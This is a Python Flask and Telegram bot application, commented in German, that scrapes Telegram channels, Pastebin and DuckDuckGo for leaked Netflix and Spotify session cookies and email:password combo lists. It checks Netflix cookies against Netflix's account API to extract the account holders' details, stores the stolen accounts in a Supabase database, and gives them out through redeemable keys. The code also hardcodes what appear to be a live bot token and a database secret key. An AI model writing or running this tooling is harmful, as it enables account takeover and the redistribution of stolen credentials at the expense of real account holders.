import threading
import time
import re
import json
import os
import random
import telebot
from flask import Flask, request, jsonify, render_template
import requests
from bs4 import BeautifulSoup

app = Flask(__name__)

# DEIN NEUER BOT TOKEN
BOT_TOKEN = '8980059554:AAGi4797fL5HA4HIfFO74HFhEEmt6A2OoUQ'
bot = telebot.TeleBot(BOT_TOKEN)

# DEINE SUPABASE DATEN
SUPABASE_URL = "https://drrbibjafmqcxqhxswfy.supabase.co" 
SUPABASE_KEY = "sb_secret_8v78Z65NYG5BHQvCciywbQ_KSUWQuO_"

def get_headers():
    return {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}", "Content-Type": "application/json", "Prefer": "return=representation"}

TELEGRAM_CHANNELS = ["freetohell", "Crackers_Official", "internettweaksforum", "netflix_disney_hotstar_nord", "mrplan254", "DARKNET240", "PremiumAccounts_Free", "Combos"]
REDDIT_SUBS = ["accountsharing", "AccountShare", "subscriptionsharing"]

PATTERN = re.compile(r'((?:NetflixId|SecureNetflixId|sp_dc|sp_key)=[^;]+(?:;\s*(?:NetflixId|SecureNetflixId|sp_dc|sp_key)=[^;]+)*)|(https?://(?:www\.)?(?:netflix|spotify|disneyplus)\.com/[^\s]+)|([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}:[^\s]+)', re.IGNORECASE)

def get_platform(item):
    if "netflix.com" in item or "NetflixId" in item: return "netflix"
    if "spotify.com" in item or "sp_dc" in item: return "spotify"
    if "disneyplus.com" in item: return "disney"
    if ':' in item and '@' in item: return "combo"
    return "unknown"

def get_netflix_info(item):
    headers = {'User-Agent': 'Mozilla/5.0'}
    if not item.startswith('http') and 'NetflixId' in item:
        headers['Cookie'] = item
        try:
            r = requests.get('https://www.netflix.com/api/shakti/v3/account', headers=headers, timeout=10)
            if r.status_code == 200:
                u = r.json().get('userInfo', {})
                return {"email": u.get('email', 'Hidden'), "password": None, "country": u.get('countryOfSignup', 'Unknown'), "plan": u.get('currentPlan', 'Premium'), "profiles": u.get('profiles', [])}
        except: pass
    return {"email": "Hidden", "password": None, "country": "Unknown", "plan": "Premium", "profiles": []}

def scrape_duckduckgo():
    try:
        r = requests.get('https://html.duckduckgo.com/html/?q=site:pastebin.com+"NetflixId="', timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
        soup = BeautifulSoup(r.text, 'html.parser')
        for a in soup.select('.result__a')[:5]:
            url = a['href']
            if 'pastebin.com' in url and '/raw/' not in url:
                raw_r = requests.get(url.replace('pastebin.com/', 'pastebin.com/raw/'), timeout=5)
                if raw_r.status_code == 200: yield raw_r.text
    except: pass

def scrape_pastebin():
    try:
        r = requests.get("https://pastebin.com/archive", timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
        soup = BeautifulSoup(r.text, 'html.parser')
        for link in soup.select('table.archive-table a')[:10]:
            raw_r = requests.get("https://pastebin.com/raw/" + link['href'].strip('/'), timeout=5)
            if raw_r.status_code == 200: yield raw_r.text
    except: pass

def grabber_loop():
    while True:
        found_raw = []
        for channel in TELEGRAM_CHANNELS:
            try:
                r = requests.get(f"https://t.me/s/{channel}", timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
                for m in PATTERN.findall(r.text):
                    item = m[0] if m[0] else (m[1] if m[1] else m[2])
                    if item and item not in found_raw: found_raw.append(item)
            except: pass

        for text in scrape_duckduckgo():
            for m in PATTERN.findall(text):
                item = m[0] if m[0] else (m[1] if m[1] else m[2])
                if item and item not in found_raw: found_raw.append(item)

        for text in scrape_pastebin():
            for m in PATTERN.findall(text):
                item = m[0] if m[0] else (m[1] if m[1] else m[2])
                if item and item not in found_raw: found_raw.append(item)

        if found_raw:
            for item in found_raw:
                if SUPABASE_URL and SUPABASE_KEY:
                    platform = get_platform(item)
                    meta = get_netflix_info(item) if platform == "netflix" else {"email": "Combo/Token", "password": None, "country": "Unknown", "plan": "Premium", "profiles": []}
                    newKey = 'CLM-' + os.urandom(4).hex().upper()
                    requests.post(f"{SUPABASE_URL}/rest/v1/keys", headers=get_headers(), json={"key": newKey, "data": item, "metadata": meta, "used": False, "platform": platform})
        time.sleep(300) 

def bot_loop():
    @bot.message_handler(commands=['start', 'help'])
    def send_welcome(message):
        bot.reply_to(message, "Willkommen!\nSende /key netflix oder /key spotify")

    @bot.message_handler(commands=['key'])
    def send_key(message):
        try:
            args = message.text.split()
            platform = args[1].lower() if len(args) > 1 else "netflix" 
            r = requests.get(f"{SUPABASE_URL}/rest/v1/keys?data=not.is.null&used=eq.false&platform=eq.{platform}&limit=1", headers=get_headers())
            if r.status_code == 200 and r.json():
                bot.reply_to(message, f"Dein {platform.capitalize()} Key: `{r.json()[0]['key']}`\n\nLöse ihn ein: https://multi-cloud-final.onrender.com", parse_mode='Markdown')
            else:
                bot.reply_to(message, f"❌ Keine {platform.capitalize()} Accounts verfügbar.")
        except Exception as e: bot.reply_to(message, f"Fehler: {e}")
    bot.polling(none_stop=True)

threading.Thread(target=grabber_loop, daemon=True).start()
threading.Thread(target=bot_loop, daemon=True).start()

@app.route('/')
def home(): return render_template('index.html')

@app.route('/api/claim', methods=['POST'])
def claim():
    data = request.json
    r = requests.get(f"{SUPABASE_URL}/rest/v1/keys?key=eq.{data.get('key')}&used=eq.false&data=not.is.null", headers=get_headers())
    if r.status_code == 200 and r.json():
        k = r.json()[0]
        requests.patch(f"{SUPABASE_URL}/rest/v1/keys?id=eq.{k['id']}", headers=get_headers(), json={"used": True})
        return jsonify({"success": True, "data": k['data'], "meta": k['metadata'], "platform": k.get('platform', 'unknown')})
    return jsonify({"success": False, "msg": "Key ungültig oder leer!"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
